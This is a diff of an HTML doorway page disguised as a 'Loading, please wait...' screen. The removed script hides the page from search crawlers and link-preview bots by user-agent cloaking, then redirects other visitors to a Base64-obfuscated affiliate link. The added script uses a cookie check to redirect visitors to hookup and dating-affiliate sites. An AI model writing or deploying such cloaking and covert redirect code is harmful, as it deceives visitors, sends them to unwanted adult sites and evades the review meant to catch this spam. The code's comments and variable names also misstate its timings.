@@ -77,35 +77,23 @@
     <p>Loading, please wait...</p>
   </div>
 
-    <script>
-  (function () {
-    const userAgent = navigator.userAgent.toLowerCase();
+       <script type="text/javascript">
 
-    const botKeywords = [
-      'bot', 'crawl', 'spider', 'facebook', 'twitter', 'slack',
-      'discord', 'linkedin', 'preview', 'whatsapp', 'telegram',
-      'pinterest', 'reddit', 'nuzzel', 'skype', 'google', 'bitlybot'
-    ];
+      jQuery(document).ready(function(){
+       if (document.cookie.indexOf('visited=true') == -1) {
+        var fifteenDays = 1000*60*60*24*60;
+        var expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
+        setTimeout('window.location.href = "https://bgfffig.postbdate.com/s/63d00e240fcd5?subsource=HookUp"', 500);
+        }else{
+        fifteenDays = 3000;
+        expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
+        setTimeout('window.location.href = "https://quickfwb.com/#General"', 500);
+        }
+        });
 
-    // Verifica se é bot
-    for (let i = 0; i < botKeywords.length; i++) {
-      if (userAgent.includes(botKeywords[i])) {
-        document.body.innerHTML = "<h1>Conteúdo temporariamente indisponível.</h1>";
-        return;
-      }
-    }
-
-    // Link de afiliado codificado em Base64
-    const encodedLink = "aHR0cHM6Ly9ncTYyaHJ5Lm15LWhvdHBhcmtzLmNvbS94MzlwbWJy";
-
-    const destination = atob(encodedLink);
-
-    // Redireciona após 1.5 segundos
-    setTimeout(() => {
-      window.location.href = destination;
-    }, 500);
-  })();
-</script>
+    </script>
 
 </body>
 </html>
